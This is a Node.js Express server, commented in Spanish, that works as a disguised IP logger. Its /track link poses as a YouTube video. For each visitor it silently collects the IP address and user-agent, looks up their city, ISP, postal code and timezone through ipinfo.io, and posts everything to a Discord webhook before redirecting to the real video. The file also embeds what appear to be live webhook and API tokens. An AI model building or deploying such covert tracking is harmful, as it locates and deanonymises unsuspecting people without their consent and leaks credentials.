const express = require("express");
const path = require("path");
const fetch = require("node-fetch"); // Asegúrate de instalar node-fetch

const app = express();
const PORT = process.env.PORT || 3000;

// URL del video real
const REAL_YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

// Webhook de Discord (¡no lo dejes expuesto si es real!)
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI";

// Servir archivos estáticos desde la carpeta "public"
app.use(express.static(path.join(__dirname, "public")));

// Función para obtener información de la IP (ubicación, ISP, etc.)
async function getIPInfo(ip) {
  try {
    const res = await fetch(`https://ipinfo.io/${ip}/json?token=2588357cc4131e`);
    return await res.json();
  } catch (err) {
    console.error("Error al obtener info de IP:", err);
    return {};
  }
}

// Función para enviar los datos a Discord
async function sendToDiscord(info, userAgent, timestamp) {
  const message = {
    content: `📡 **Nueva visita al video falso**\n\n🕒 Hora (UTC): ${timestamp}\n🌐 IP: \`${info.ip || "Desconocida"}\`\n🏙️ Ciudad: ${info.city || "Desconocida"}, ${info.region || "Desconocida"}\n🌍 País: ${info.country || "Desconocido"}\n🏢 ISP: ${info.org || "Desconocido"}\n📦 ASN: ${info.asn || "Desconocido"}\n📫 Código Postal: ${info.postal || "Desconocido"}\n🕰️ Zona Horaria: ${info.timezone || "Desconocido"}\n🧭 User-Agent:\n\`\`\`${userAgent || "No disponible"}\`\`\``
  };

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message)
    });
  } catch (err) {
    console.error("Error al enviar al webhook:", err);
  }
}

// Ruta para realizar el tracking de la visita
app.get("/track", async (req, res) => {
  // Extraer la IP correctamente
  const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").split(",")[0].trim();
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();

  // Obtener la información de la IP
  const info = await getIPInfo(ip);
  info.ip = ip;

  // Enviar los datos al webhook de Discord
  await sendToDiscord(info, userAgent, timestamp);

  // Redirigir al video real en YouTube
  res.redirect(REAL_YOUTUBE_URL);
});

// Iniciar el servidor en el puerto especificado
app.listen(PORT, () => {
  console.log(`✅ Servidor activo en http://localhost:${PORT}`);
});
